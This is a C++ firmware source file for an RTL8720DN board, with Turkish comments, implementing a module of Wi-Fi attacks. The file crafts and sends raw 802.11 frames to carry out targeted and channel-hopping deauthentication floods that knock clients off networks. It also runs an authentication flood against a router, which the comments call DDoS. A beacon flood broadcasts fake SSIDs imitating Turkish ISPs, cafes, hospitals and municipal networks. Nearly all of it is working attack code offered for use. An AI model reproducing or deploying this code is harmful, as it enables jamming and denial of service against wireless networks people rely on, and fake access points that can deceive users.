#include "WiFiAttacks.h"
#include "debug.h"
#include <string.h>

// RTL8720DN low-level SDK for raw frame sending
extern "C" {
    #include <wifi_conf.h>    // wifi_set_channel, wifi_set_promisc
    #include <wifi_util.h>    // wext_send_mgnt
}

#ifdef ARDUINO_ARCH_ESP32
#include <esp_system.h>
#define GET_RANDOM_BYTE() (esp_random() % 256)
#else
#define GET_RANDOM_BYTE() (random(256))
#endif

// 802.11 Yönetim Çerçevesi Yapısı (basitleştirilmiş)
// Radiotap başlığı SDK tarafından eklenebilir veya eklenmeyebilir.
// Bu yapı sadece 802.11 başlığını ve gövdesini içerir.
struct ieee80211_mgmt_frame {
    uint16_t frame_control;
    uint16_t duration_id;
    uint8_t addr1[6]; // Destination MAC
    uint8_t addr2[6]; // Source MAC
    uint8_t addr3[6]; // BSSID
    uint16_t sequence_control;
    // Çerçeve gövdesi buraya gelir (örn. deauth nedeni, auth algoritması vb.)
} __attribute__((packed));

// Yaygin SSID adlari (Beacon Flood icin)
static const char* BEACON_SSID_POOL[BEACON_SSID_COUNT] = {
    "TurkTelekom_XXXX",    "Superonline_XXXX",   "TTNET_XXXX",
    "FibraNet_XXXX",       "Turkcell_XXXX",      "Vodafone_XXXX",
    "WiFi_XXXX",           "Internet_XXXX",      "AIRTES_XXXX",
    "KabloNet_XXXX",       "Millenicom_XXXX",    "Netgsm_XXXX",
    "Doping_XXXX",         "Teknoturk_XXXX",     "Aranyaka_XXXX",
    "Guest_XXXX",          "Misafir_XXXX",       "FreeWiFi_XXXX",
    "Starbucks_XXXX",      "McDonalds_XXXX",     "AVM_XXXX",
    "Ogrenci_XXXX",        "Kutuphane_XXXX",     "Kampus_XXXX",
    "Hastane_XXXX",        "Belediye_XXXX",      "Terminal_XXXX",
    "Otopark_XXXX",        "Plaj_XXXX",          "BlueJammer_XXXX"
};

WiFiAttacks::WiFiAttacks() {
    _wifi = nullptr;
    _singleDeauthActive = false;
    _deauthAllActive = false;
    _authFloodActive = false;
    _beaconFloodActive = false;
    _lastPacketMs = 0;
    _channelHopMs = 0;
    _currentChannel = 1; // Başlangıç kanalı
    _packetsSent = 0;
    _beaconSSIDIndex = 0;
    _beaconSSIDChangeMs = 0;
    memset(_targetBSSID, 0, 6);
    memset(_beaconMAC, 0, sizeof(_beaconMAC));
    _targetChannel = 0;
}

void WiFiAttacks::begin(WiFiManager* wifiMgr) {
    _wifi = wifiMgr;
    DBG_PRINTF("[WiFiAttacks] Modul baslatildi.\n");
}

// === TEKİL DEAUTH ===
bool WiFiAttacks::startSingleDeauth(uint8_t* targetBSSID, uint8_t channel) {
    if (_wifi == nullptr) {
        DBG_PRINTF("[WiFiAttacks] Hata: WiFiManager baslatilmadi.\n");
        return false;
    }
    if (isAnyRunning()) {
        DBG_PRINTF("[WiFiAttacks] Baska bir saldiri zaten aktif.\n");
        return false;
    }

    memcpy(_targetBSSID, targetBSSID, 6);
    _targetChannel = channel;
    _singleDeauthActive = true;
    _lastPacketMs = millis();
    _packetsSent = 0;

    _wifi->setMode(WIFI_MODE_PROMISCUOUS);
    _wifi->setChannel(_targetChannel);
    
    DBG_PRINTF("[WiFiAttacks] Tekil Deauth baslatildi. Hedef BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Kanal: %d\n",
        _targetBSSID[0], _targetBSSID[1], _targetBSSID[2], _targetBSSID[3], _targetBSSID[4], _targetBSSID[5],
        _targetChannel);
    return true;
}

void WiFiAttacks::stopSingleDeauth() {
    if (_singleDeauthActive) {
        _singleDeauthActive = false;
        DBG_PRINTF("[WiFiAttacks] Tekil Deauth durduruldu.\n");
    }
}

bool WiFiAttacks::isSingleDeauthRunning() {
    return _singleDeauthActive;
}

// === TÜMÜNÜ DEAUTH ET ===
bool WiFiAttacks::startDeauthAll() {
    if (_wifi == nullptr) {
        DBG_PRINTF("[WiFiAttacks] Hata: WiFiManager baslatilmadi.\n");
        return false;
    }
    if (isAnyRunning()) {
        DBG_PRINTF("[WiFiAttacks] Baska bir saldiri zaten aktif.\n");
        return false;
    }

    _deauthAllActive = true;
    _lastPacketMs = millis();
    _channelHopMs = millis();
    _currentChannel = 1;
    _packetsSent = 0;

    _wifi->setMode(WIFI_MODE_PROMISCUOUS);
    _wifi->setChannel(_currentChannel);
    
    DBG_PRINTF("[WiFiAttacks] Tumunu Deauth baslatildi. Kanallar arasi geciş.\n");
    return true;
}

void WiFiAttacks::stopDeauthAll() {
    if (_deauthAllActive) {
        _deauthAllActive = false;
        DBG_PRINTF("[WiFiAttacks] Tumunu Deauth durduruldu.\n");
    }
}

bool WiFiAttacks::isDeauthAllRunning() {
    return _deauthAllActive;
}

// === YÖNLENDİRİCİYE DDoS (AUTH FLOOD) ===
bool WiFiAttacks::startAuthFlood(uint8_t* targetBSSID, uint8_t channel) {
    if (_wifi == nullptr) {
        DBG_PRINTF("[WiFiAttacks] Hata: WiFiManager baslatilmadi.\n");
        return false;
    }
    if (isAnyRunning()) {
        DBG_PRINTF("[WiFiAttacks] Baska bir saldiri zaten aktif.\n");
        return false;
    }

    memcpy(_targetBSSID, targetBSSID, 6);
    _targetChannel = channel;
    _authFloodActive = true;
    _lastPacketMs = millis();
    _packetsSent = 0;

    _wifi->setMode(WIFI_MODE_PROMISCUOUS);
    _wifi->setChannel(_targetChannel);
    
    DBG_PRINTF("[WiFiAttacks] Auth Flood baslatildi. Hedef BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Kanal: %d\n",
        _targetBSSID[0], _targetBSSID[1], _targetBSSID[2], _targetBSSID[3], _targetBSSID[4], _targetBSSID[5],
        _targetChannel);
    return true;
}

void WiFiAttacks::stopAuthFlood() {
    if (_authFloodActive) {
        _authFloodActive = false;
        DBG_PRINTF("[WiFiAttacks] Auth Flood durduruldu.\n");
    }
}

bool WiFiAttacks::isAuthFloodRunning() {
    return _authFloodActive;
}

// === BEACON FLOOD ===
bool WiFiAttacks::startBeaconFlood() {
    if (_wifi == nullptr) {
        DBG_PRINTF("[WiFiAttacks] Hata: WiFiManager baslatilmadi.\n");
        return false;
    }
    if (isAnyRunning()) {
        DBG_PRINTF("[WiFiAttacks] Baska bir saldiri zaten aktif.\n");
        return false;
    }

    _beaconFloodActive = true;
    _lastPacketMs = millis();
    _channelHopMs = millis();
    _beaconSSIDChangeMs = millis();
    _currentChannel = 1;
    _beaconSSIDIndex = 0;
    _packetsSent = 0;

    for (int m = 0; m < 3; m++) {
        _beaconMAC[m][0] = GET_RANDOM_BYTE() & 0xFE;
        _beaconMAC[m][1] = GET_RANDOM_BYTE();
        _beaconMAC[m][2] = GET_RANDOM_BYTE();
        _beaconMAC[m][3] = GET_RANDOM_BYTE();
        _beaconMAC[m][4] = GET_RANDOM_BYTE();
        _beaconMAC[m][5] = GET_RANDOM_BYTE();
    }

    _wifi->setMode(WIFI_MODE_PROMISCUOUS);
    _wifi->setChannel(_currentChannel);

    DBG_PRINTF("[WiFiAttacks] Beacon Flood baslatildi. 30 SSID ile kanallar arasi geziyor.\n");
    return true;
}

void WiFiAttacks::stopBeaconFlood() {
    if (_beaconFloodActive) {
        _beaconFloodActive = false;
        DBG_PRINTF("[WiFiAttacks] Beacon Flood durduruldu.\n");
    }
}

bool WiFiAttacks::isBeaconFloodRunning() {
    return _beaconFloodActive;
}

int WiFiAttacks::getBeaconSSIDIndex() {
    return _beaconSSIDIndex;
}

// === GENEL ===
void WiFiAttacks::stopAll() {
    stopSingleDeauth();
    stopDeauthAll();
    stopAuthFlood();
    stopBeaconFlood();
}

bool WiFiAttacks::isAnyRunning() {
    return _singleDeauthActive || _deauthAllActive || _authFloodActive || _beaconFloodActive;
}

void WiFiAttacks::update() {
    if (_wifi == nullptr) return;

    unsigned long currentMs = millis();

    // Tekil Deauth
    if (_singleDeauthActive) {
        if (currentMs - _lastPacketMs >= (1000 / DEAUTH_PACKET_RATE)) {
            uint8_t frameBuffer[MAX_FRAME_SIZE];
            uint8_t broadcastMAC[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            uint16_t frameLen = _craftDeauthFrame(frameBuffer, _targetBSSID, broadcastMAC);
            if (frameLen > 0) {
                _sendFrame(frameBuffer, frameLen);
                _packetsSent++;
            }
            _lastPacketMs = currentMs;
        }
    }

    // Tümünü Deauth Et
    if (_deauthAllActive) {
        // Kanal atlama mantığı
        if (currentMs - _channelHopMs >= 200) { // Her 200ms'de bir kanal değiştir
            _currentChannel++;
            if (_currentChannel > WIFI_CHANNEL_MAX) {
                _currentChannel = 1;
            }
            _wifi->setChannel(_currentChannel);
            DBG_PRINTF("[WiFiAttacks] Kanal degisti: %d\n", _currentChannel);
            _channelHopMs = currentMs;
        }

        // Paket gönderme mantığı
        if (currentMs - _lastPacketMs >= (1000 / DEAUTH_ALL_RATE)) {
            uint8_t frameBuffer[MAX_FRAME_SIZE];
            uint8_t broadcastMAC[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            // Deauth All için hedef BSSID'yi bilmiyoruz, bu yüzden rastgele bir BSSID veya 
            // tarama sonuçlarından alınan BSSID'ler kullanılabilir.
            // Şimdilik, sadece broadcast MAC'i kullanarak genel bir deauth gönderelim.
            // Gerçek bir "Deauth All" için, taranan tüm AP'lere ayrı ayrı deauth göndermek gerekir.
            // Bu örnekte, sadece broadcast deauth gönderiyoruz.
            uint16_t frameLen = _craftDeauthFrame(frameBuffer, broadcastMAC, broadcastMAC); // BSSID olarak broadcast kullan
            if (frameLen > 0) {
                _sendFrame(frameBuffer, frameLen);
                _packetsSent++;
            }
            _lastPacketMs = currentMs;
        }
    }

    // Auth Flood
    if (_authFloodActive) {
        if (currentMs - _lastPacketMs >= (1000 / AUTH_FLOOD_RATE)) {
            uint8_t frameBuffer[MAX_FRAME_SIZE];
            uint16_t frameLen = _craftAuthFrame(frameBuffer, _targetBSSID, nullptr);
            if (frameLen > 0) {
                _sendFrame(frameBuffer, frameLen);
                _packetsSent++;
            }
            _lastPacketMs = currentMs;
        }
    }

    // Beacon Flood
    if (_beaconFloodActive) {
        // Kanal atlama - her 300ms'de bir kanal degistir
        if (currentMs - _channelHopMs >= 300) {
            _currentChannel++;
            if (_currentChannel > WIFI_CHANNEL_MAX) {
                _currentChannel = 1;
            }
            _wifi->setChannel(_currentChannel);
            _channelHopMs = currentMs;
        }

        // SSID degistirme - her 2 saniyede bir farkli SSID
        if (currentMs - _beaconSSIDChangeMs >= 2000) {
            _beaconSSIDIndex = (_beaconSSIDIndex + 1) % BEACON_SSID_COUNT;
            _beaconSSIDChangeMs = currentMs;
        }

        // Beacon gonder (BEACON_FLOOD_RATE kadar/sn)
        if (currentMs - _lastPacketMs >= (1000 / BEACON_FLOOD_RATE)) {
            uint8_t frameBuffer[MAX_FRAME_SIZE];
            // Her beacon'da hafifce farkli MAC kullan
            uint8_t beaconMAC[6];
            for (int b = 0; b < 6; b++) {
                beaconMAC[b] = _beaconMAC[_packetsSent % 3][b];
            }
            beaconMAC[5] = (beaconMAC[5] + _packetsSent) % 256; // Her pakette son byte degissin

            uint16_t frameLen = _craftBeaconFrame(frameBuffer,
                BEACON_SSID_POOL[_beaconSSIDIndex],
                _currentChannel,
                beaconMAC);
            if (frameLen > 0) {
                _sendFrame(frameBuffer, frameLen);
                _packetsSent++;
            }
            _lastPacketMs = currentMs;
        }
    }
}

void WiFiAttacks::setChannel(uint8_t channel) {
    _targetChannel = channel;
    if (_wifi != nullptr) {
        _wifi->setChannel(_targetChannel);
        DBG_PRINTF("[WiFiAttacks] Kanal ayarlandi: %d\n", _targetChannel);
    }
}

// === PAKET OLUŞTURMA YARDIMCILARI ===

// Deauth çerçevesi oluşturur
uint16_t WiFiAttacks::_craftDeauthFrame(uint8_t* buffer, const uint8_t* bssid, const uint8_t* stationMAC) {
    // 802.11 Deauthentication Management Frame
    // Frame Control: 0xC0 0x00 (Type: Management, Subtype: Deauthentication)
    // Duration: 0x00 0x00
    // Address 1 (Destination): stationMAC (or broadcast FF:FF:FF:FF:FF:FF)
    // Address 2 (Source): bssid
    // Address 3 (BSSID): bssid
    // Sequence Control: incrementing
    // Frame Body: Reason Code (0x07 0x00 = Class 3 frame received from nonassociated station)

    if (buffer == nullptr) return 0;

    ieee80211_mgmt_frame* mgmt_frame = (ieee80211_mgmt_frame*)buffer;

    mgmt_frame->frame_control = 0x00C0; // Little-endian: C0 00
    mgmt_frame->duration_id = 0x0000;   // Duration (şimdilik 0)

    // Adresler
    memcpy(mgmt_frame->addr1, stationMAC, 6); // Hedef MAC (istemci veya yayın)
    memcpy(mgmt_frame->addr2, bssid, 6);      // Kaynak MAC (AP'nin MAC'i)
    memcpy(mgmt_frame->addr3, bssid, 6);      // BSSID

    // Sequence Control (basit bir artırma)
    // Her paket için benzersiz bir sıra numarası sağlamak için daha gelişmiş bir mekanizma gerekebilir.
    // Şimdilik, sadece _packetsSent'i kullanıyoruz.
    mgmt_frame->sequence_control = _packetsSent % 4096; // 12 bit sıra numarası

    // Çerçeve gövdesi (Reason Code)
    uint16_t reason_code = 0x0007; // Reason Code: Class 3 frame received from nonassociated station
    memcpy(buffer + sizeof(ieee80211_mgmt_frame), &reason_code, 2);

    return sizeof(ieee80211_mgmt_frame) + 2; // Toplam çerçeve uzunluğu
}

// Auth çerçevesi oluşturur
uint16_t WiFiAttacks::_craftAuthFrame(uint8_t* buffer, const uint8_t* bssid, const uint8_t* stationMAC_unused) {
    // 802.11 Authentication Management Frame
    // Frame Control: 0xB0 0x00 (Type: Management, Subtype: Authentication)
    // Duration: 0x00 0x00
    // Address 1 (Destination): bssid
    // Address 2 (Source): Random MAC
    // Address 3 (BSSID): bssid
    // Sequence Control: incrementing
    // Frame Body:
    //   Authentication Algorithm Number: 0x00 0x00 (Open System)
    //   Authentication Sequence Number:  0x01 0x00 (Sequence 1)
    //   Status Code:                     0x00 0x00 (Success)

    if (buffer == nullptr) return 0;

    ieee80211_mgmt_frame* mgmt_frame = (ieee80211_mgmt_frame*)buffer;

    mgmt_frame->frame_control = 0x00B0; // Little-endian: B0 00
    mgmt_frame->duration_id = 0x0000;   // Duration (şimdilik 0)

    // Adres 1 (Destination): BSSID
    memcpy(mgmt_frame->addr1, bssid, 6);

    // Adres 2 (Source): Rastgele MAC adresi
    uint8_t randomMAC[6];
    randomMAC[0] = GET_RANDOM_BYTE() & 0xFE; // Unicast, Locally Administered
    randomMAC[1] = GET_RANDOM_BYTE();
    randomMAC[2] = GET_RANDOM_BYTE();
    randomMAC[3] = GET_RANDOM_BYTE();
    randomMAC[4] = GET_RANDOM_BYTE();
    randomMAC[5] = GET_RANDOM_BYTE();
    memcpy(mgmt_frame->addr2, randomMAC, 6);

    // Adres 3 (BSSID): BSSID
    memcpy(mgmt_frame->addr3, bssid, 6);

    // Sequence Control
    mgmt_frame->sequence_control = _packetsSent % 4096; // 12 bit sıra numarası

    // Çerçeve gövdesi (Authentication Frame Body)
    uint16_t auth_alg_num = 0x0000; // Open System (Little-endian)
    uint16_t auth_seq_num = 0x0100; // Sequence 1 (Little-endian)
    uint16_t status_code = 0x0000;  // Success (Little-endian)

    uint8_t* frame_body_ptr = buffer + sizeof(ieee80211_mgmt_frame);
    memcpy(frame_body_ptr, &auth_alg_num, 2);
    memcpy(frame_body_ptr + 2, &auth_seq_num, 2);
    memcpy(frame_body_ptr + 4, &status_code, 2);

    return sizeof(ieee80211_mgmt_frame) + 6; // Toplam çerçeve uzunluğu
}

// Beacon çerçevesi oluşturur
// 802.11 Beacon Frame: AP'nin varligini duyurmak icin periyodik olarak gonderilir
uint16_t WiFiAttacks::_craftBeaconFrame(uint8_t* buffer, const char* ssid, uint8_t channel, const uint8_t* mac) {
    if (buffer == nullptr || ssid == nullptr) return 0;

    uint16_t pos = 0;

    // === 802.11 Management Header (24 bytes) ===
    // Frame Control: Beacon (0x80 0x00)
    buffer[pos++] = 0x80;
    buffer[pos++] = 0x00;
    // Duration (2 bytes)
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    // Address 1: Broadcast (FF:FF:FF:FF:FF:FF)
    memset(buffer + pos, 0xFF, 6);
    pos += 6;
    // Address 2: Source (AP MAC)
    memcpy(buffer + pos, mac, 6);
    pos += 6;
    // Address 3: BSSID (same as source)
    memcpy(buffer + pos, mac, 6);
    pos += 6;
    // Sequence Control (2 bytes)
    buffer[pos++] = (_packetsSent % 4096) & 0xFF;
    buffer[pos++] = ((_packetsSent % 4096) >> 8) & 0xFF;

    // === Frame Body: Tagged Parameters ===
    // Timestamp (8 bytes) - simdilik 0
    memset(buffer + pos, 0, 8);
    pos += 8;
    // Beacon Interval (2 bytes) - 100 TU = ~1.024 sn
    buffer[pos++] = 0x64;
    buffer[pos++] = 0x00;
    // Capability Info (2 bytes): ESS=1, Privacy=0
    buffer[pos++] = 0x04;
    buffer[pos++] = 0x00;

    // SSID Tag (0x00)
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    buffer[pos++] = 0x00;          // Tag Number: SSID
    buffer[pos++] = ssidLen;       // Tag Length
    memcpy(buffer + pos, ssid, ssidLen);
    pos += ssidLen;

    // Supported Rates Tag (0x01)
    // IEEE 802.11b/g/n temel hizlar
    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
    buffer[pos++] = 0x01;          // Tag Number: Supported Rates
    buffer[pos++] = 8;             // Tag Length
    memcpy(buffer + pos, rates, 8);
    pos += 8;

    // DS Parameter Set Tag (0x03) - Kanali belirtir
    buffer[pos++] = 0x03;          // Tag Number: DS Parameter Set
    buffer[pos++] = 1;             // Tag Length
    buffer[pos++] = channel;       // Current Channel

    // Extended Supported Rates Tag (0x32) - Ek hizlar
    uint8_t extRates[] = { 0x30, 0x48, 0x60, 0x6C };
    buffer[pos++] = 0x32;          // Tag Number: Extended Supported Rates
    buffer[pos++] = 4;             // Tag Length
    memcpy(buffer + pos, extRates, 4);
    pos += 4;

    // HT Capabilities Tag (0x2D) - 802.11n ozellikleri (istege bagli, basit)
    buffer[pos++] = 0x2D;          // Tag Number: HT Capabilities
    buffer[pos++] = 26;            // Tag Length
    // HT Capabilities Info (2 bytes): 40MHz, SGI20, SGI40, etc.
    memset(buffer + pos, 0, 26);   // Basit doldur
    pos += 26;

    return pos; // Toplam frame uzunlugu
}

// Ham yonetim cercevesini gonderir
// RTL8720DN SDK: wext_send_mgnt("wlan0", buf, len, flags)
void WiFiAttacks::_sendFrame(const uint8_t* frame, uint16_t len) {
    if (_wifi == nullptr || frame == nullptr || len == 0) return;

    int ret = wext_send_mgnt("wlan0", (char*)frame, len, 0);
    if (ret != 0) {
        DBG_PRINTF("[WiFiAttacks] _sendFrame basarisiz (ret=%d)\n", ret);
    }
}
